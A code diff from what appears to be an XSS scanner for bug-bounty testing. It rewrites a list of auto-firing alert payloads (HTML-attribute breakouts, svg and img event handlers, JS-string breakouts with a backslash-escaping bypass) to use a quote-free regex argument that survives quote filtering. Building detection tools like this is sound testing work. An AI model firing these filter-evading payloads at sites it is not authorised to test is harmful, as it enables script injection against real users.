@@ -43,24 +43,28 @@ BREAKOUTS = {
 # they stay candidates for the browser-execution pass to confirm.
 EXECUTABLE_ON_REFLECTION = {"html", "attr_dq", "attr_sq"}
 
-# Auto-firing execution payloads for the browser confirmation pass. Ordered HTML-context first, then
-# JS-STRING context (a value reflected inside a quoted JS string, e.g. `var x='HERE'`) — including a
-# leading-backslash variant that neutralises an app that escapes the quote (\' ) but not the backslash,
-# the classic backslash-escaping bypass. General across any JS-string reflection, not GinAndJuice-specific.
+# Auto-firing execution payloads for the browser confirmation pass. The alert ARGUMENT is a quote-free
+# regex literal `/bbhx7/` (its String() is "/bbhx7/", which carries the MARK the dialog handler matches) —
+# NOT alert('bbhx7'). This matters for the JS-STRING context (a value reflected inside a quoted JS string,
+# `var x='HERE'`): an app that escapes the breakout quote also escapes any quote INSIDE the payload, so an
+# alert('...') is neutralised while alert(/.../ ) survives. Ordered HTML-context first, then JS-string,
+# including a leading-backslash variant that neutralises an app that escapes the quote (\') but not the
+# backslash — the classic backslash-escaping bypass. General across any reflection, not GinAndJuice-specific.
+_A = "/" + MARK + "/"   # quote-free regex-literal alert arg; String(/bbhx7/) contains MARK
 EXEC_PAYLOADS = (
-    f'"><img src=x onerror=alert("{MARK}")>',
-    f"'><img src=x onerror=alert('{MARK}')>",
-    f'<img src=x onerror=alert("{MARK}")>',
-    f'"><svg onload=alert("{MARK}")>',
-    f"</script><svg onload=alert('{MARK}')>",
-    f'javascript:alert("{MARK}")',
+    '"><img src=x onerror=alert(' + _A + ')>',
+    "'><img src=x onerror=alert(" + _A + ")>",
+    '<img src=x onerror=alert(' + _A + ')>',
+    '"><svg onload=alert(' + _A + ')>',
+    "</script><svg onload=alert(" + _A + ")>",
+    "javascript:alert(" + _A + ")",
     # JS-string breakouts (single/double quote; plain + backslash-bypass; concat + statement forms)
-    "';alert('" + MARK + "')//",
-    "\";alert('" + MARK + "')//",
-    "\\';alert('" + MARK + "')//",
-    "\\\";alert('" + MARK + "')//",
-    "'-alert('" + MARK + "')-'",
-    "\"-alert('" + MARK + "')-\"",
+    "';alert(" + _A + ")//",
+    "\";alert(" + _A + ")//",
+    "\\';alert(" + _A + ")//",
+    "\\\";alert(" + _A + ")//",
+    "'-alert(" + _A + ")-'",
+    "\"-alert(" + _A + ")-\"",
 )
 
 
